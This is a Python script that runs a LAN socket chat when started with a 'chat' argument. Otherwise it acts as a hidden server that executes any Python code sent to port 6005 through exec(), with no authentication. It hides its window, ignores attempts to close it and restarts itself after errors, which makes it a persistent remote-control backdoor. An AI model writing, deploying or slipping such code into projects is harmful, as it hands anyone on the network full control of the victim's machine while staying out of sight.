# coding:utf-8

import asyncio
from colorama import *
import socket
import threading
import subprocess
from tkinter import *
import time
import os
import random
import sys
import keyboard
import psutil
import datetime as dt
import base64
import requests
import sys
import webbrowser
import json
init()

if len(sys.argv) and "chat" in [args.strip().lower() for args in sys.argv]:

    def get_args():
        __type, _ip_adress = "", ""
        for arg in sys.argv:
            if "type=" in arg:
                __type = "".join(arg.split("=")[1:])
            if "ip_adress=" in arg:
                _ip_adress = "".join(arg.split("=")[1:])
        return __type, _ip_adress


    _type, ip_adress = get_args()
    print("\n" * 100)  # To erase any content


    def find_ipv4():
        output = subprocess.check_output("ipconfig", shell=True).__str__().strip()
        lines = output.split("\n")
        ipv4_line = [line for line in lines if "ipv4" in line.lower()][0]
        ipv4 = ""
        i = len(ipv4_line)
        while True:
            i -= 1
            char = ipv4_line[i]
            if char not in ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', "."]:
                break
            ipv4 += char
        ipv4 = ipv4[::-1]
        return ipv4


    class ClientThread(threading.Thread):
        def __init__(self, conn):
            threading.Thread.__init__(self)
            self.conn = conn

        def run(self):
            while True:
                data = self.conn.recv(8192).decode("utf-8")
                if not data:
                    break
                print(Fore.LIGHTGREEN_EX + data)
            self.conn.close()


    ipv4 = find_ipv4()
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host, port = "", 4287
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                  1)  # For the sk socket to be reusable multiple times without waiting delay
    sk.bind((host, port))


    def message(string):
        return f"[{dt.datetime.now().strftime('%B %d %H:%M:%S')}] {ipv4} >>> {string}"


    def send_message(s, msg):
        msg = message(msg)
        data = msg.encode("utf-8")  # Return the utf-8 encoded text to transfer using the socket protocol
        s.sendall(data)
        print(Fore.LIGHTGREEN_EX + msg)


    def send():
        while True:
            input_user = input("").strip()

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip_adress, port))
                send_message(s=s, msg=input_user)

            except Exception as e:
                print(e)
            finally:
                s.close()


    def rcv():
        while True:
            sk.listen(5)
            conn, address = sk.accept()
            client_thread = ClientThread(conn)
            client_thread.start()
        conn.close()


    threading.Thread(target=rcv).start()
    send()
    exit()


def find_ipv4():
    output = subprocess.check_output("ipconfig", shell=True).__str__().strip()
    lines = output.split("\n")
    ipv4_line = [line for line in lines if "ipv4" in line.lower()][0]
    ipv4 = ""
    i = len(ipv4_line) - 1
    while True:
        char = ipv4_line[i]
        if char not in ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', "."]:
            break
        ipv4 += char
        i -= 1
    ipv4 = ipv4[::-1]
    return ipv4


def remote(data):
    try:
        exec(data, globals())
        print("execution worked properly !")
    except Exception as e:
        print("There was an error during execution : ", e)


class ClientThread(threading.Thread):
    def __init__(self, conn):
        threading.Thread.__init__(self)
        self.conn = conn

    def run(self):
        data = ""
        i = 0
        while True:
            i += 1
            new = self.conn.recv(65536).decode("utf-8")  # New part of the data transferred by the socket
            data += new
            print(f"Executed for the {i} time : ", data)
            if not new:
                break
        threading.Thread(target=lambda: remote(data)).start()
        self.conn.close()


ipv4 = find_ipv4()
sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host, port = "", 6005
sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
              1)  # For the sk socket to be reusable multiple times without waiting delay
sk.bind((host, port))
print(f"Server started on http://{ipv4}:{port}")


def start_server():
    while True:
        try:
            sk.listen(5)
            conn, address = sk.accept()
            print(f"The client {address} just connected.")
            client_thread = ClientThread(conn)
            client_thread.run()
        except Exception as e:
            print(e)
            os.system(f"python {os.getcwd()}\\{os.path.basename(__file__)}")
    sk.close()


threading.Thread(target=start_server).start()

root = Tk()
root.protocol("WM_DELETE_WINDOW", root.withdraw)
root.withdraw()
root.mainloop()
